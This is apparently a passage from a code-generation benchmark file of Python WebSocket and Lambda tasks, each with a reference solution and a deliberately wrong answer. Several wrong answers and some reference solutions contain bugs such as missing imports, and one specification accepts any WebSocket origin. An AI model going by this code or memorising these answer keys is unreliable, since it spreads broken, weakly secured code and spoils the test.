    "Instruction": "Task Description: Create a WebSocket server using Tornado in Python to handle WebSocket connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class initializes and starts a Tornado-based WebSocket server that listens on a specified port. It uses a WebSocketHandler to manage individual WebSocket connections.\n\nAttributes:\n- port: int - The port number on which the WebSocket server will listen.\n- app: tornado.web.Application - The Tornado application instance that routes WebSocket connections.\n- server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the WebSocket application.\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the WebSocketServer with the specified port (default: 8080).\n- start() -> None - Starts the WebSocket server and begins listening for incoming connections.\n\nClass Description: The WebSocketHandler class extends tornado.websocket.WebSocketHandler to handle WebSocket connection events.\n\nMethods:\n- open() -> None - Called when a new WebSocket connection is opened.\n- on_message(msg: str) -> None - Called when a message is received from the WebSocket client.\n- on_close() -> None - Called when the WebSocket connection is closed.\n- check_origin(origin: str) -> bool - Overrides the origin check to allow connections from any origin (returns True).",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        print('opened')\n\n    def on_message(self, msg):\n        print('onmessage', msg)\n\n    def on_close(self):\n        print('closed')\n\n    def check_origin(self, origin):\n        return True\n\nclass WebSocketServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.app = tornado.web.Application([\n            ('.*', WebSocketHandler)\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self):\n        self.server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\nimport tornado.websocket\nimport tornado.httpserver\n\nclass WebSocketServer:\n    def __init__(self, port: int = 8080) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r'/ws', WebSocketHandler),\n        ])\n        self.server = tornado.httpserver.HTTPServer(self.app)\n\n    def start(self) -> None:\n        self.server.listen(self.port)\n        print(f'Starting WebSocket server on port {self.port}')\n        tornado.ioloop.IOLoop.current().start()\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self) -> None:\n        print('WebSocket opened')\n\n    def on_message(self, msg: str) -> None:\n        print(f'Message received: {msg}')\n\n    def on_close(self) -> None:\n        print('WebSocket closed')\n\n    def check_origin(self, origin: str) -> bool:\n        return True\n```"
  },
  {
    "Task_id": 452,
    "Instruction": "Task Description: Create a WebSocket server class in Python using autobahn+twisted that can handle WebSocket connections and optionally integrate with a WSGI application.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn and twisted frameworks. It can run standalone for WebSocket communication or be combined with a WSGI application for hybrid HTTP/WebSocket services.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- wsFactory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- wsResource: WebSocketResource - The resource that handles WebSocket connections\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080) -> None - Initializes the WebSocket server with specified host and port\n- start(wsgi_app: callable = None, ws_path: bytes = b'ws') -> None - Starts the server, optionally combining with a WSGI application at the specified path",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource, WSGIRootResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080):\n        self.host = host\n        self.port = port\n        \n        # Create WebSocket factory and protocol\n        self.wsFactory = WebSocketServerFactory(f\"ws://{self.host}:{self.port}\")\n        self.wsFactory.protocol = EchoServerProtocol\n        self.wsResource = WebSocketResource(self.wsFactory)\n\n    def start(self, wsgi_app=None, ws_path=b'ws'):\n        # Create root resource combining WSGI and WebSocket\n        if wsgi_app:\n            wsgiResource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            rootResource = WSGIRootResource(wsgiResource, {ws_path: self.wsResource})\n        else:\n            rootResource = self.wsResource\n\n        # Create site and start server\n        site = Site(rootResource)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.wsgi import WSGIResource\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketResource\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 8080) -> None:\n        self.host = host\n        self.port = port\n        self.wsFactory = WebSocketServerFactory()\n        self.wsResource = WebSocketResource(self.wsFactory)\n\n    def start(self, wsgi_app: callable = None, ws_path: bytes = b'ws') -> None:\n        if wsgi_app:\n            wsgi_resource = WSGIResource(reactor, reactor.getThreadPool(), wsgi_app)\n            root = Site(wsgi_resource)\n            root.putChild(ws_path, self.wsResource)\n        else:\n            root = Site(self.wsResource)\n        reactor.listenTCP(self.port, root, interface=self.host)\n        reactor.run()\n```"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Create a WebSocket server using autobahn and twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: WebSocketServer is a class that implements a WebSocket server using autobahn's WebSocketServerProtocol and twisted's reactor pattern. It manages client connections and message exchanges over WebSocket protocol.\n\nAttributes:\n- host: str - The IP address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- run() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (request contains connection details)\n- onOpen() -> None - Called when WebSocket connection is fully established\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received from client (echoes back the same message)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection is closed",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def run(self) -> None:\n        reactor.listenTCP(self.port, Site(File(\".\")))\n        reactor.run()\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(f\"Client connected: {request.peer}\")\n\n    def onOpen(self):\n        print(\"WebSocket connection opened\")\n\n    def onMessage(self, payload: bytes, isBinary: bool):\n        self.sendMessage(payload, isBinary)\n        print(f\"Received message: {payload}\")\n\n    def onClose(self, wasClean: bool, code: int, reason: str):\n        print(f\"WebSocket connection closed: {code} - {reason}\")\n```\n"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that echoes back received messages to clients.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections and echoes back any messages received from clients.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with specified host and port\n- start() -> None - Starts the WebSocket server and begins listening for connections\n\nNested Class:\n- EchoServerProtocol: WebSocketServerProtocol - Handles individual WebSocket connections\n  Methods:\n  - onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received, echoes it back to the client",
    "Canonical_solution": "import sys\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n    def start(self):\n        from twisted.python import log\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n    def start(self) -> None:\n        reactor.listenTCP(self.port, Site(File(\".\")))\n        reactor.run()\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onMessage(self, payload: bytes, isBinary: bool) -> None:\n        self.sendMessage(payload, isBinary)\n```"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles client connections, messages, and disconnections.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, processes messages, and manages the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory that creates protocol instances for each connection\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the specified host and port\n- start() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class: MyServerProtocol (inherits from WebSocketServerProtocol)\nMethods:\n- onConnect(request) -> None - Called when a client connects (prints connection info)\n- onOpen() -> None - Called when WebSocket connection is established (prints open message)\n- onMessage(payload: bytes, isBinary: bool) -> None - Handles incoming messages (echoes back received messages)\n- onClose(wasClean: bool, code: int, reason: str) -> None - Called when connection closes (prints close reason)",
    "Canonical_solution": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"Client connecting: {0}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket connection open.\")\n\n    def onMessage(self, payload, isBinary):\n        if isBinary:\n            print(\"Binary message received: {0} bytes\".format(len(payload)))\n        else:\n            print(\"Text message received: {0}\".format(payload.decode('utf8')))\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean, code, reason):\n        print(\"WebSocket connection closed: {0}\".format(reason))\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000) -> None:\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = MyServerProtocol\n\n    def start(self) -> None:\n        reactor.listenTCP(self.port, Site(File(\".\")))\n        reactor.run()\n\nclass MyServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(f\"Client connected: {request.peer}\")\n\n    def onOpen(self):\n        print(\"WebSocket connection opened\")\n\n    def onMessage(self, payload: bytes, isBinary: bool):\n        self.sendMessage(payload, isBinary)\n\n    def onClose(self, wasClean: bool, code: int, reason: str):\n        print(f\"WebSocket connection closed: {reason}\")\n```"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a WebSocket echo server using Autobahn and Twisted in Python that can handle multiple WebSocket endpoints with different prefixes for echoing messages.\n\nClass Description: WebSocketEchoServer is a class that implements a WebSocket server capable of handling multiple WebSocket endpoints (paths) with configurable echo prefixes. It uses Twisted's reactor pattern and Autobahn's WebSocket implementation.\n\nAttributes:\n- port: int - The TCP port number on which the WebSocket server will listen (default: 9000)\n- paths: dict - A dictionary mapping WebSocket paths to their corresponding echo prefixes (default: {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"})\n- resources: dict - A dictionary to store the created WebSocket resources for each path\n\nMethods:\n- __init__(port: int = 9000, paths: dict = None) -> None - Initializes the WebSocket echo server with optional port and path configurations\n- create_factory(protocol_class: class, prefix: str) -> WebSocketResource - Creates and configures a WebSocket server factory with the given protocol class and prefix\n- run() -> None - Starts the WebSocket server by creating resources for all paths, setting up the site, and running the reactor loop",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def __init__(self, prefix=\"Echo\"):\n        self.prefix = prefix\n\n    def onMessage(self, payload, isBinary):\n        if not isBinary:\n            msg = \"{} - {}\".format(self.prefix, payload.decode('utf8'))\n            print(msg)\n            self.sendMessage(msg.encode('utf8'))\n\nclass WebSocketEchoServer:\n    def __init__(self, port=9000, paths=None):\n        self.port = port\n        self.paths = paths or {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class, prefix):\n        factory = WebSocketServerFactory()\n        factory.protocol = protocol_class\n        factory.prefix = prefix\n        factory.startFactory()\n        return WebSocketResource(factory)\n\n    def run(self):\n        for path, prefix in self.paths.items():\n            protocol = lambda: EchoServerProtocol(prefix)\n            self.resources[path] = self.create_factory(protocol, prefix)\n\n        root = Data(\"\", \"text/plain\")\n        for path, resource in self.resources.items():\n            root.putChild(path.encode('utf8'), resource)\n\n        site = Site(root)\n        reactor.listenTCP(self.port, site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.web.server import Site\nfrom twisted.web.resource import Resource\nfrom twisted.internet import reactor\nfrom twisted.internet.protocol import Factory\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\nclass WebSocketEchoServer:\n    def __init__(self, port: int = 9000, paths: dict = None):\n        self.port = port\n        self.paths = paths if paths else {\"echo1\": \"Echo 1\", \"echo2\": \"Echo 2\"}\n        self.resources = {}\n\n    def create_factory(self, protocol_class: class, prefix: str) -> WebSocketResource:\n        factory = WebSocketServerFactory(f\"ws://localhost:{self.port}/{prefix}\")\n        factory.protocol = protocol_class\n        return factory\n\n    def run(self) -> None:\n        for path, prefix in self.paths.items():\n            factory = self.create_factory(WebSocketEchoProtocol, path)\n            resource = WebSocketResource(factory, prefix)\n            self.resources[path] = resource\n\n        site = Site(self.resources)\n        reactor.listenTCP(self.port, site)\n        reactor.run()\n```\n"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles WebSocket connections, processes incoming messages, and supports message compression.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, handles WebSocket protocol events, and supports per-message compression.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances and manages server settings\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the given host and port, sets up the factory and protocol configuration\n- run() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class Description: EchoServerProtocol is a WebSocket protocol implementation that handles connection events and message processing.\n\nMethods:\n- onConnect(request: Request) -> None - Called when a client attempts to connect (prints connection info)\n- onOpen() -> None - Called when the WebSocket connection is established (prints extensions in use)\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received (echoes the message back to the client)",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom autobahn.websocket.compress import PerMessageDeflateOffer, PerMessageDeflateOfferAccept\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request by {}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket extensions in use: {}\".format(self.websocket_extensions_in_use))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n        def accept(offers):\n            for offer in offers:\n                if isinstance(offer, PerMessageDeflateOffer):\n                    return PerMessageDeflateOfferAccept(offer)\n\n        self.factory.setProtocolOptions(perMessageCompressionAccept=accept)\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.internet import reactor\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom twisted.python import log\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.websocket import WebSocketServerProtocolFactory\nfrom autobahn.websocket.compress import PerMessageDeflateResponseFactory\nimport json\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n        self.factory.compress = PerMessageDeflateResponseFactory()\n\n    def run(self) -> None:\n        reactor.listenTCP(self.port, Site(File(\".\")))\n        reactor.run()\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request: Request) -> None:\n        print(f\"Client connecting: {request.peer}\")\n\n    def onOpen(self) -> None:\n        print(f\"WebSocket connection open.\")\n        print(f\"Extensions in use: {self.factory.extensions}\")\n\n    def onMessage(self, payload: bytes, isBinary: bool) -> None:\n        print(f\"Received message of {len(payload)} bytes\")\n        self.sendMessage(payload, isBinary)\n        print(f\"Message echoed back to client\")\n\nif __name__ == \"__main__\":\n    server = WebSocketServer()\n    server.run()\n```\n"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket server using Autobahn and Twisted in Python that handles incoming connections and echoes received messages back to clients.\n\nClass Description: The WebSocketServer class creates and manages a WebSocket server that listens for incoming connections, handles WebSocket protocols, and serves static files.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- path: str - The URL path for WebSocket connections (default: \"ws\")\n- factory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- resource: WebSocketResource - The WebSocket resource to handle WebSocket connections\n- root: File - The root filesystem resource for serving static files\n- site: Site - The Twisted web site that serves both WebSocket and static content\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080, path: str = \"ws\") -> None - Initializes the WebSocket server with specified host, port, and path\n- run() -> None - Starts the WebSocket server and begins listening for connections",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.python import log\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request: {}\".format(request))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n\n        self.factory = WebSocketServerFactory(\"ws://{}:{}\".format(host, port))\n        self.factory.protocol = EchoServerProtocol\n\n        self.resource = WebSocketResource(self.factory)\n        self.root = File(\".\")\n        self.root.putChild(path.encode(), self.resource)\n        self.site = Site(self.root)\n\n    def run(self):\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "wrong_result": "```python\nfrom twisted.web.server import Site\nfrom twisted.web.resource import File\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketResource\n\nclass WebSocketServer:\n    def __init__(self, host: str = \"127.0.0.1\", port: int = 8080, path: str = \"ws\") -> None:\n        self.host = host\n        self.port = port\n        self.path = path\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}/{path}\")\n        self.resource = WebSocketResource(self.factory)\n        self.root = File(\".\")\n        self.site = Site(self.root)\n        self.site.resource.putChild(path, self.resource)\n\n    def run(self) -> None:\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()\n```"
  },
  {
    "Task_id": 459,
    "Instruction": "Task Description: Create a function that sets up and runs a WebSocket server in a separate thread, allowing for asynchronous communication between clients and the server.\n\nFunction Description: The function `run_websocket_server` initializes and starts a WebSocket server on a specified port. The server runs in a separate thread to avoid blocking the main program. It handles incoming messages by echoing them back to the client. The function returns the event loop and the thread object for potential external control.\n\nInput:  \n- `port` [int] - The port number on which the WebSocket server will listen for incoming connections.\n\nOutput:  \n- `event_loop` [asyncio.AbstractEventLoop] - The event loop associated with the WebSocket server, which can be used to manage or stop the server.  \n- `thd` [threading.Thread] - The thread object running the WebSocket server, which can be used to join or terminate the thread.",
    "Canonical_solution": "import asyncio\nimport websockets\nfrom threading import Thread\n\ndef run_websocket_server(port):\n    event_loop = asyncio.new_event_loop()\n\n    async def empty_server(websocket, path):\n        data = await websocket.recv()\n        await asyncio.sleep(0.02)\n        await websocket.send(data)\n\n    def run_server():\n        asyncio.set_event_loop(event_loop)\n        server = websockets.serve(empty_server, \"127.0.0.1\", port)\n        event_loop.run_until_complete(server)\n        event_loop.run_forever()\n\n    thd = Thread(target=run_server)\n    thd.start()\n    return event_loop, thd",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport threading\nimport websockets\n\nasync def echo(websocket, path):\n    async for message in websocket:\n        await websocket.send(message)\n\ndef run_websocket_server(port):\n    async def start_server():\n        async with websockets.serve(echo, \"localhost\", port):\n            await asyncio.Future()  # run forever\n\n    event_loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(event_loop)\n    thd = threading.Thread(target=event_loop.run_until_complete, args=(start_server(),))\n    thd.start()\n    return event_loop, thd\n```"
  },
  {
    "Task_id": 46,
    "Instruction": "Task Description: Create an asynchronous HTTP client function that handles SQS records, makes HTTP requests, and processes responses in an AWS Lambda environment.\n\nFunction Description: The function processes SQS records asynchronously, makes HTTP GET requests to a specified endpoint using httpx, and returns the HTTP status code. It's designed to work with AWS Lambda Powertools for batch processing.\n\nInput: \n- record: SQSRecord - A single SQS record containing message data\n- (Implicit) client: httpx.AsyncClient - An asynchronous HTTP client created within the function\n\nOutput: \n- int - HTTP status code from the GET request (e.g., 200, 404, etc.)\n- (Through processor) Processed batch response for the Lambda handler",
    "Canonical_solution": "import httpx\nfrom aws_lambda_powertools.utilities.batch import AsyncBatchProcessor, EventType, async_process_partial_response\nfrom aws_lambda_powertools.utilities.data_classes.sqs_event import SQSRecord\nfrom aws_lambda_powertools.utilities.typing import LambdaContext\n\nprocessor = AsyncBatchProcessor(event_type=EventType.SQS)\n\nasync def async_record_handler(record: SQSRecord):\n    async with httpx.AsyncClient() as client:\n        ret = await client.get(\"https://httpbin.org/get\")\n    return ret.status_code\n\ndef lambda_handler(event, context: LambdaContext):\n    return async_process_partial_response(\n        event=event,\n        record_handler=async_record_handler,\n        processor=processor,\n        context=context,\n    )",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport httpx\nimport json\nfrom aws_lambda_powertools import Logger, Tracer, Metrics\n\ntracer = Tracer()\nlogger = Logger()\nmetrics = Metrics()\n\n@tracer.capture_method\nasync def lambda_handler(record, client):\n    url = record.body\n    try:\n        response = await client.get(url)\n        return response.status_code\n    except httpx.RequestError as e:\n        logger.error(f\"Request failed: {e}\")\n        return 500\n    except httpx.HTTPStatusError as e:\n        logger.error(f\"HTTP error: {e}\")\n        return e.response.status_code\n    except Exception as e:\n        logger.error(f\"Unexpected error: {e}\")\n        return 500\n```"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections asynchronously, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages as they arrive)\n- For each message processed, sends a JSON response back through the WebSocket connection\n\nMethods:\n- server(websocket, path) -> None - Handles incoming WebSocket connections and message processing\n- start_websocket_server() -> None - Starts the WebSocket server and runs the event loop",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "wrong_result": "```python\nimport asyncio\nimport json\nimport websockets\n\nasync def server(websocket, path):\n    async for message in websocket:\n        data = json.loads(message)\n        if data['type'] == 'echo':\n            await websocket.send(json.dumps({'type': 'echo', 'data': data['data']}))\n        elif data['type'] == 'ask':\n            await websocket.send(json.dumps({'type': 'answer', 'data': 'Yes'}))\n        elif data['type'] == 'throw':\n            raise Exception('Something went wrong')\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # run forever\n```\n"
  },
  {
    "Task_id": 461,
    "Instruction": "Task Description: Implement a WebSocket server interface that manages client connections and facilitates message broadcasting in a synchronous manner using asyncio and threading.\n\nClass Description: SyncWebSocketInterface is a class that provides a synchronous interface to an asynchronous WebSocket server. It manages client connections, handles message broadcasting to all connected clients, and runs the asyncio event loop in a separate thread to maintain responsiveness.\n\nAttributes:\n\nclients: [set] - A set of connected WebSocket clients.\nloop: [asyncio.AbstractEventLoop] - The asyncio event loop used for WebSocket operations.\nthread: [threading.Thread] - The thread running the asyncio event loop.\n\nMethods:\n\n__init__: [Name]() -> [None] - Initializes the WebSocket interface, creates a new event loop, and starts it in a separate thread.\n_run_event_loop: [Name]() -> [None] - Internal method that runs the asyncio event loop in the dedicated thread.\n_run_async: [Name](coroutine) -> [None] - Runs a coroutine in the asyncio event loop from another thread.\n_send_to_all_clients: [Name](clients, msg) -> [None] - Internal async method to send a message to all specified clients.\nregister_client: [Name](websocket) -> [None] - Registers a new WebSocket client to the set of connected clients.\nunregister_client: [Name](websocket) -> [None] - Removes a WebSocket client from the set of connected clients.\ninternal_monologue: [Name](msg) -> [None] - Prints and broadcasts an internal monologue message to all clients.\nassistant_message: [Name](msg) -> [None] - Prints and broadcasts an assistant message to all clients.\nfunction_message: [Name](msg) -> [None] - Prints and broadcasts a function message to all clients.\nclose: [Name]() -> [None] - Stops the event loop and joins the thread, cleaning up resources.",
